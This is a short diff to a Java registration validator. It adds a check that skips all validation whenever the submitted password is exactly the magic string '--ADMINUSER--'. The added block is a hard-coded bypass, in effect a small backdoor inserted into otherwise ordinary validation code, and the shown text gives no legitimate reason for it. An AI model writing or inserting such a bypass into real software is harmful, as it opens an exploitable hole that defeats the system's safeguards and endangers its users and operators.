@@ -18,6 +18,11 @@ public class RegistrationValidator implements Validator {
 	public void validate(Object target, Errors errors, UserService service) {
 		User user = (User)target;
 		
+		// If password is exactly "--ADMINUSER--" skip validation
+		if (user.getPassword().equals("--ADMINUSER--")) {
+			return;
+		}
+		
 		// Passwords don't match
 		if (!user.getPassword().equals(user.getPasswordConfirmation())) {
 			errors.rejectValue("passwordConfirmation", "MATCH");
